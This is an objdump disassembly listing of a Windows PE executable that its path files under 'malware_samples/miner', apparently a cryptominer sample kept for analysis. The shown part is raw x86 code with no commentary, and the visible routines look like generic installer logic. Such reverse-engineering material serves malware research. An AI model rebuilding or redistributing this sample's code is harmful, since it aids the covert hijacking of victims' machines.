
malware_samples/miner/adfc6c376e891220b1c5a56a7234f5ae88c55939af665aed055d372a06d2bc08.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 28 47 42 00    	mov    0x424728,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 04 82 40 00    	call   *0x408204
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 34 47 42 00    	mov    0x424734,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 08 82 40 00    	call   *0x408208
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 0c 82 40 00    	call   *0x40820c
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 60 80 40 00    	mov    0x408060,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 5c 80 40 00    	call   *0x40805c
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 10 82 40 00    	call   *0x408210
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 58 80 40 00    	call   *0x408058
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 54 80 40 00    	call   *0x408054
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 50 80 40 00    	call   *0x408050
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 4c 80 40 00    	mov    0x40804c,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 20 3f 42 00       	push   $0x423f20
  401155:	57                   	push   %edi
  401156:	ff 15 68 82 40 00    	call   *0x408268
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 6c 82 40 00    	call   *0x40826c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 68 47 42 00       	mov    0x424768,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 6c 47 42 00    	cmp    0x42476c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 6c 47 42 00    	cmp    0x42476c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 68 47 42 00    	mov    0x424768,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 6c 47 42 00    	cmp    0x42476c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 6c 47 42 00    	cmp    0x42476c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 68 47 42 00       	mov    0x424768,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 6c 47 42 00    	cmp    %esi,0x42476c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 6c 47 42 00    	cmp    0x42476c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 34 47 42 00       	mov    0x424734,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 6c 47 42 00    	mov    0x42476c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 68 47 42 00    	mov    0x424768,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 50 42 00       	mov    $0x425000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 32 4d 00 00       	call   0x4060b8
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 70 47 42 00    	mov    0x424770,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 0c 3f 42 00    	add    %eax,0x423f0c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 f4 3e 42 00    	push   0x423ef4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 0c 3f 42 00    	push   0x423f0c
  4013e4:	ff 15 44 81 40 00    	call   *0x408144
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 00 82 40 00    	call   *0x408200
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 34 47 42 00    	mov    0x424734,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 00 a8 40 00       	push   $0x40a800
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 37 3e 00 00       	call   0x405268
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec c8 01 00 00    	sub    $0x1c8,%esp
  40143d:	a1 28 47 42 00       	mov    0x424728,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d c8             	lea    -0x38(%ebp),%edi
  40144e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401458:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 50 42 00       	mov    $0x425000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  401474:	89 0d 3c b8 40 00    	mov    %ecx,0x40b83c
  40147a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 2f 15 00 00    	ja     0x4029b8
  401489:	ff 24 8d ca 29 40 00 	jmp    *0x4029ca(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 d1 3d 00 00       	call   0x405268
  401497:	e9 b2 0e 00 00       	jmp    0x40234e
  40149c:	ff 05 ec 3e 42 00    	incl   0x423eec
  4014a2:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a5:	0f 84 a3 0e 00 00    	je     0x40234e
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 78 82 40 00    	call   *0x408278
  4014b2:	e9 97 0e 00 00       	jmp    0x40234e
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 f9 14 00 00       	jmp    0x4029c3
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 97 3d 00 00       	call   0x405268
  4014d1:	e9 e2 14 00 00       	jmp    0x4029b8
  4014d6:	53                   	push   %ebx
  4014d7:	e8 2e 16 00 00       	call   0x402b0a
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	59                   	pop    %ecx
  4014e0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e3:	7f 03                	jg     0x4014e8
  4014e5:	33 c0                	xor    %eax,%eax
  4014e7:	40                   	inc    %eax
  4014e8:	50                   	push   %eax
  4014e9:	ff 15 8c 80 40 00    	call   *0x40808c
  4014ef:	e9 c4 14 00 00       	jmp    0x4029b8
  4014f4:	ff 75 f8             	push   -0x8(%ebp)
  4014f7:	ff 15 44 82 40 00    	call   *0x408244
  4014fd:	e9 b6 14 00 00       	jmp    0x4029b8
  401502:	c1 e0 02             	shl    $0x2,%eax
  401505:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401508:	75 26                	jne    0x401530
  40150a:	8b 88 c0 47 42 00    	mov    0x4247c0(%eax),%ecx
  401510:	6a 01                	push   $0x1
  401512:	89 88 00 48 42 00    	mov    %ecx,0x424800(%eax)
  401518:	e8 ed 15 00 00       	call   0x402b0a
  40151d:	59                   	pop    %ecx
  40151e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401521:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401524:	89 04 8d c0 47 42 00 	mov    %eax,0x4247c0(,%ecx,4)
  40152b:	e9 88 14 00 00       	jmp    0x4029b8
  401530:	8b 88 00 48 42 00    	mov    0x424800(%eax),%ecx
  401536:	89 88 c0 47 42 00    	mov    %ecx,0x4247c0(%eax)
  40153c:	e9 77 14 00 00       	jmp    0x4029b8
  401541:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401544:	8d 34 85 c0 47 42 00 	lea    0x4247c0(,%eax,4),%esi
  40154b:	33 c0                	xor    %eax,%eax
  40154d:	8b 0e                	mov    (%esi),%ecx
  40154f:	3b cb                	cmp    %ebx,%ecx
  401551:	0f 94 c0             	sete   %al
  401554:	23 4d d8             	and    -0x28(%ebp),%ecx
  401557:	8b 44 85 cc          	mov    -0x34(%ebp,%eax,4),%eax
  40155b:	89 0e                	mov    %ecx,(%esi)
  40155d:	e9 61 14 00 00       	jmp    0x4029c3
  401562:	ff 34 95 c0 47 42 00 	push   0x4247c0(,%edx,4)
  401569:	56                   	push   %esi
  40156a:	e9 f1 13 00 00       	jmp    0x402960
  40156f:	8b 0d f0 3e 42 00    	mov    0x423ef0,%ecx
  401575:	8b 35 48 82 40 00    	mov    0x408248,%esi
  40157b:	3b cb                	cmp    %ebx,%ecx
  40157d:	74 07                	je     0x401586
  40157f:	52                   	push   %edx
  401580:	51                   	push   %ecx
  401581:	ff d6                	call   *%esi
  401583:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401586:	8b 0d 04 3f 42 00    	mov    0x423f04,%ecx
  40158c:	3b cb                	cmp    %ebx,%ecx
  40158e:	0f 84 24 14 00 00    	je     0x4029b8
  401594:	50                   	push   %eax
  401595:	51                   	push   %ecx
  401596:	ff d6                	call   *%esi
  401598:	e9 1b 14 00 00       	jmp    0x4029b8
  40159d:	6a f0                	push   $0xfffffff0
  40159f:	e8 88 15 00 00       	call   0x402b2c
  4015a4:	ff 75 d0             	push   -0x30(%ebp)
  4015a7:	50                   	push   %eax
  4015a8:	ff 15 b4 80 40 00    	call   *0x4080b4
  4015ae:	85 c0                	test   %eax,%eax
  4015b0:	0f 85 02 14 00 00    	jne    0x4029b8
  4015b6:	e9 c8 11 00 00       	jmp    0x402783
  4015bb:	6a f0                	push   $0xfffffff0
  4015bd:	e8 6a 15 00 00       	call   0x402b2c
  4015c2:	8b f8                	mov    %eax,%edi
  4015c4:	57                   	push   %edi
  4015c5:	e8 a8 45 00 00       	call   0x405b72
  4015ca:	8b f0                	mov    %eax,%esi
  4015cc:	3b f3                	cmp    %ebx,%esi
  4015ce:	74 54                	je     0x401624
  4015d0:	6a 5c                	push   $0x5c
  4015d2:	56                   	push   %esi
  4015d3:	e8 2c 45 00 00       	call   0x405b04
  4015d8:	8b f0                	mov    %eax,%esi
  4015da:	8a 06                	mov    (%esi),%al
  4015dc:	88 1e                	mov    %bl,(%esi)
  4015de:	3a c3                	cmp    %bl,%al
  4015e0:	88 45 0b             	mov    %al,0xb(%ebp)
  4015e3:	75 16                	jne    0x4015fb
  4015e5:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4015e8:	74 11                	je     0x4015fb
  4015ea:	e8 d9 41 00 00       	call   0x4057c8
  4015ef:	85 c0                	test   %eax,%eax
  4015f1:	74 08                	je     0x4015fb
  4015f3:	57                   	push   %edi
  4015f4:	e8 35 41 00 00       	call   0x40572e
  4015f9:	eb 06                	jmp    0x401601
  4015fb:	57                   	push   %edi
  4015fc:	e8 aa 41 00 00       	call   0x4057ab
  401601:	3b c3                	cmp    %ebx,%eax
  401603:	74 15                	je     0x40161a
  401605:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40160a:	75 0b                	jne    0x401617
  40160c:	57                   	push   %edi
  40160d:	ff 15 fc 80 40 00    	call   *0x4080fc
  401613:	a8 10                	test   $0x10,%al
  401615:	75 03                	jne    0x40161a
  401617:	ff 45 fc             	incl   -0x4(%ebp)
  40161a:	8a 45 0b             	mov    0xb(%ebp),%al
  40161d:	88 06                	mov    %al,(%esi)
  40161f:	46                   	inc    %esi
  401620:	3a c3                	cmp    %bl,%al
  401622:	75 ac                	jne    0x4015d0
  401624:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401627:	74 29                	je     0x401652
  401629:	6a e6                	push   $0xffffffe6
  40162b:	e8 f3 fd ff ff       	call   0x401423
  401630:	57                   	push   %edi
  401631:	68 00 a8 42 00       	push   $0x42a800
  401636:	e8 06 4b 00 00       	call   0x406141
  40163b:	57                   	push   %edi
  40163c:	ff 15 00 81 40 00    	call   *0x408100
  401642:	85 c0                	test   %eax,%eax
  401644:	0f 85 6e 13 00 00    	jne    0x4029b8
  40164a:	ff 45 fc             	incl   -0x4(%ebp)
  40164d:	e9 66 13 00 00       	jmp    0x4029b8
  401652:	6a f5                	push   $0xfffffff5
  401654:	e9 4b 0c 00 00       	jmp    0x4022a4
  401659:	53                   	push   %ebx
  40165a:	e8 cd 14 00 00       	call   0x402b2c
  40165f:	50                   	push   %eax
  401660:	e8 df 4d 00 00       	call   0x406444
  401665:	e9 81 06 00 00       	jmp    0x401ceb
  40166a:	6a d0                	push   $0xffffffd0
  40166c:	e8 bb 14 00 00       	call   0x402b2c
  401671:	6a df                	push   $0xffffffdf
  401673:	8b f0                	mov    %eax,%esi
  401675:	e8 b2 14 00 00       	call   0x402b2c
  40167a:	6a 13                	push   $0x13
  40167c:	8b f8                	mov    %eax,%edi
  40167e:	e8 a9 14 00 00       	call   0x402b2c
  401683:	57                   	push   %edi
  401684:	56                   	push   %esi
  401685:	ff 15 04 81 40 00    	call   *0x408104
  40168b:	85 c0                	test   %eax,%eax
  40168d:	74 07                	je     0x401696
  40168f:	6a e3                	push   $0xffffffe3
  401691:	e9 0e 0c 00 00       	jmp    0x4022a4
  401696:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401699:	0f 84 e4 10 00 00    	je     0x402783
  40169f:	56                   	push   %esi
  4016a0:	e8 9f 4d 00 00       	call   0x406444
  4016a5:	85 c0                	test   %eax,%eax
  4016a7:	0f 84 d6 10 00 00    	je     0x402783
  4016ad:	57                   	push   %edi
  4016ae:	56                   	push   %esi
  4016af:	e8 6c 48 00 00       	call   0x405f20
  4016b4:	6a e4                	push   $0xffffffe4
  4016b6:	e9 e9 0b 00 00       	jmp    0x4022a4
  4016bb:	53                   	push   %ebx
  4016bc:	e8 6b 14 00 00       	call   0x402b2c
  4016c1:	8b f0                	mov    %eax,%esi
  4016c3:	8d 45 08             	lea    0x8(%ebp),%eax
  4016c6:	50                   	push   %eax
  4016c7:	57                   	push   %edi
  4016c8:	68 00 04 00 00       	push   $0x400
  4016cd:	56                   	push   %esi
  4016ce:	ff 15 08 81 40 00    	call   *0x408108
